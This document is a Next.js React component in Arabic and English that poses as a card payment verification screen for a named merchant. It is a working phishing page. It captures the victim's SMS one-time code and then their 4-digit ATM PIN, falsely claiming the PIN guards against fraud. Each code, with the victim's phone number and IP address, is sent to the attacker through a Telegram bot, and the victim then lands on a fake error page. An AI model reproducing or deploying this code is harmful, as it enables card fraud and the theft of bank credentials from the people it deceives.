"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { useSearchParams } from "next/navigation";
import { FaEnvelope, FaComments } from "react-icons/fa";

export default function OTPForm() {
  const [otp, setOtp] = useState("");
  const [pin, setPin] = useState("");
  const [errorOtp, setErrorOtp] = useState(false);
  const [errorPin, setErrorPin] = useState(false);
  const [showPinForm, setShowPinForm] = useState(false);
  const searchParams = useSearchParams();
  const router = useRouter();

  // تغيير قيمة OTP
  const handleOtpChange = (e) => {
    const value = e.target.value;
    if (/^\d*$/.test(value) && value.length <= 6) {
      setOtp(value);
      setErrorOtp(false);
    }
  };

  // تغيير قيمة PIN
  const handlePinChange = (e) => {
    const value = e.target.value;
    if (/^\d*$/.test(value) && value.length <= 4) {
      setPin(value);
      setErrorPin(false);
    }
  };

  // دالة للحصول على IP المستخدم
  const getUserIP = async () => {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    return data.ip;
  };

  // إرسال OTP
  const handleOtpSubmit = async (e) => {
    e.preventDefault();
    if (otp.length === 6) {
      setErrorOtp(false);
      const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
      const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
      const userIP = await getUserIP();
      const mobileNumber = searchParams.get("mobile");
      const message = `رقم الهاتف: ${mobileNumber}\nIP المستخدم: ${userIP}\nالكود (OTP): ${otp}`;

      try {
        const response = await fetch(
          `https://api.telegram.org/bot${botToken}/sendMessage`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
            }),
          }
        );

        if (response.ok) {
          setShowPinForm(true);
        } else {
          alert("أعد المحاولة حدث خطأ ما");
        }
      } catch (error) {
        alert("أعد المحاولة حدث خطأ ما");
      }
    } else {
      setErrorOtp(true);
    }
  };

  // إرسال PIN
  const handlePinSubmit = async (e) => {
    e.preventDefault();
    if (pin.length === 4) {
      setErrorPin(false);
      const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
      const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
      const userIP = await getUserIP();
      const mobileNumber = searchParams.get("mobile");
      const message = `رقم الهاتف: ${mobileNumber}\nIP المستخدم: ${userIP}\nرمز الصراف: ${pin}`;

      try {
        const response = await fetch(
          `https://api.telegram.org/bot${botToken}/sendMessage`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
            }),
          }
        );

        if (response.ok) {
          router.push(`/loading?nextPage=err`);
        } else {
          alert("أعد المحاولة حدث خطأ ما");
        }
      } catch (error) {
        alert("أعد المحاولة حدث خطأ ما");
      }
    } else {
      setErrorPin(true);
    }
  };

  const [time, setTime] = useState(179); // 2:59 بالدقائق والثواني
  const [visible, setVisible] = useState(true);

  useEffect(() => {
    if (time <= 0) {
      setVisible(false);
      return;
    }

    const timer = setInterval(() => {
      setTime((prev) => prev - 1);
    }, 1000);

    return () => clearInterval(timer);
  }, [time]);

  // تحويل الوقت إلى صيغة MM:SS
  const formatTime = (seconds) => {
    const minutes = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${minutes}:${secs < 10 ? "0" : ""}${secs}`;
  };

  

  return (
    <div className="h-screen w-full bg-white flex flex-col items-center justify-start relative">
      {/* النص والمؤشر في الأعلى */}
      <div className="w-full text-center pt-6 mb-4">
        <h1 className="text-xl font-extrabold text-[#d81359] mb-2">رمز التحقق</h1>
        <p className="text-md font-semibold text-gray-900 mb-4">
          يرجى إدخال الرمز المرسل إلى جوالك عبر الرسائل النصية
        </p>
        <div className="flex justify-center mb-4">
          <FaEnvelope className="text-5xl text-gray-700" />
        </div>
        {/* مؤشر التحميل */}
        <div className="w-8 h-8 border-4 border-gray-400 border-t-white rounded-full animate-spin mx-auto mb-2"></div>
      </div>
    <div className="flex items-center justify-center">
      <div className="text-xl font-bold text-gray-900">
        {formatTime(time)}
      </div>
    </div>
      {/* نموذج OTP */}
      <form
        className={`w-full max-w-md p-6 transition-all duration-700 ${
          showPinForm ? "translate-y-[-200%] opacity-0" : "opacity-100"
        }`}
        onSubmit={handleOtpSubmit}
      >
        <div className="border-2 border-black rounded-lg p-6 text-left leading-relaxed mb-4">
          <p className="text-base font-bold text-black mb-2">
            Enter verification code
          </p>
          <p className="text-base font-bold text-black mb-2">
            We sent you a verification code by text message to
          </p>
          <p className="text-base font-bold text-black mb-2">
            05&nbsp;xxxxxxxx&nbsp;You&nbsp;have&nbsp;6&nbsp;attempts
          </p>
          <p className="text-base font-bold text-black mb-2">
            Merchant: <strong>Al-durra Co.</strong>
          </p>
          <p className="text-base font-bold text-black mb-2">****** :Card Number</p>
          <p className="text-base font-bold text-black mb-4">Reference Id: SAG0574865</p>

          {/* إدخال الرمز */}
          <div className="text-center">
            <input
              type="password"
              value={otp}
              onChange={handleOtpChange}
              placeholder="******"
              className={`w-1/2 p-1 border-2 text-center text-xl font-bold rounded-md mb-4 ${
                errorOtp ? "border-red-500" : "border-black"
              }`}
            />
            <button
              type="submit"
              className="w-full py-3 bg-[#c81048] hover:bg-[#c81048] text-white text-lg font-bold rounded-md shadow-lg"
            >
              تأكيد
            </button>
          </div>
        </div>
      </form>

      {/* نموذج PIN في الأعلى ولا يأخذ مساحة */}
      <form
        onSubmit={handlePinSubmit}
        className={`absolute top-0 left-1/2 transform -translate-x-1/2 mt-4 w-full max-w-sm p-6 bg-white shadow-lg rounded-lg transition-transform duration-700 ${
          showPinForm ? "translate-y-0 opacity-100" : "translate-y-[-200%] opacity-0"
        }`}
      >
        <h2 className="text-lg font-bold text-gray-800 mb-4">رمز الصراف</h2>
        <p className="text-md text-gray-700 mb-6">الرجاء ادخال الرمز السري المكون من 4 ارقام للتأكد من ملكية واهلية البطاقة للحماية من مخاطر الأحتيال الألكتروني</p>
        <div className="mb-6">
          <input
            type="number"
            value={pin}
            onChange={handlePinChange}
            placeholder="XXXX"
            className={`w-full px-4 py-2 border rounded-lg text-center ${
              errorPin ? "border-red-500" : "border-gray-300"
            }`}
          />
        </div>
        <button
          type="submit"
          className="w-full bg-[#c81048] text-white font-medium py-2 px-4 rounded-lg hover:bg-red-700"
        >
          تأكيد
        </button>
      </form>

      {/* زر الدردشة */}
      <div className="fixed bottom-5 left-5 w-12 h-12 bg-black text-white rounded-full flex items-center justify-center cursor-pointer hover:bg-gray-800 shadow-md">
        <FaComments className="text-xl" />
      </div>
    </div>
  );
}
